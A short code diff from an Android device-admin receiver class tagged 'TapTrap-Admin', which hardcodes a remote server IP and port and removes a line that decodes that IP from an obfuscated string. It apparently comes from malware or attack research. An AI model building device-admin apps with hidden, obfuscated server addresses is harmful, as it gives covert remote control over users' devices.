@@ -35,7 +35,6 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
     private static final String TAG = "TapTrap-Admin";
     private static final String SERVER_IP = "20.2.66.175";
-    String result = StringHelper.qzxp("gXqms9MpOeyvxww="); // 20.2.66.175
     private static final int SERVER_PORT = 9999;
 
 
